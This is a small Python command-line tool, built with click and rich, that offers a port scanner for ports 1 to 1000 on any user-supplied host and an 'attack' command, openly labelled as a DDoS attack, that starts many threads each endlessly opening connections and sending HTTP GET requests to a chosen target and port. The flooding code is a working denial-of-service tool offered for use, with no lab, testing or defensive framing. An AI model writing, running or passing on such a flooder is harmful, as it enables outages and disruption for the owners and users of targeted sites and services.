import click
import socket
import threading
from rich import print as rprint
from rich.console import Console
import click_completion

click_completion.init()

console = Console()
attack_num = 0


@click.command()
def scan_ports():
    try:
        hostname = input("Enter the website URL or IP address: ")
        ip_address = socket.gethostbyname(hostname)
        rprint(
            f'Scanning ports for [bold]{hostname}[/bold] ([cyan]{ip_address}[/cyan])...')
        open_ports = []

        for port in range(1, 1001):  # Scan ports 1 to 1000
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.1)  # Set a timeout for connection attempt
                result = sock.connect_ex((ip_address, port))
                if result == 0:
                    open_ports.append(port)
                    rprint(f'[green]Port {port}[/green] is open')

        if not open_ports:
            rprint('[bold yellow]No open ports found.[/bold yellow]')
        else:
            rprint('[bold]Open ports:[/bold]', open_ports)

    except socket.gaierror:
        rprint(
            '[bold red]Hostname could not be resolved. Please enter a valid hostname.[/bold red]')
    except socket.error as e:
        rprint('[bold red]Could not connect to server.[/bold red]')
        rprint(f'[italic red]{e}[/italic red]')


@click.command()
@click.argument("--target", type=click.STRING)
@click.argument("--port", type=click.INT)
@click.option("--threads", default=100, help="Number of threads for DDoS attack")
def attack(target, port, threads):
    rprint(
        f'Initiating DDoS attack on [bold]{target}[/bold] on port [cyan]{port}[/cyan] with [cyan]{threads}[/cyan] threads...')
    for _ in range(threads):
        thread = threading.Thread(target=ddos, args=(target, port))
        thread.start()


def ddos(target: str, port: int):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                target_ip = socket.gethostbyname(target)
                s.connect((target_ip, port))
                s.send(("GET / HTTP/1.1\r\n").encode('ascii'))
                s.send(("Host: " + target + "\r\n\r\n").encode('ascii'))

                global attack_num
                attack_num += 1
                rprint(f"[bold red]Attack Number: {attack_num}[/bold red]")

        except socket.gaierror as e:
            rprint(
                f"[bold red]Failed to resolve hostname {target}:[/bold red] {e}")
            break
        except Exception as e:
            rprint(f"[bold red]Error in DDoS attack:[/bold red] {e}")
            break


@click.command()
def version():
    rprint(f"[bold blue]version 0.0.1[/bold blue]")
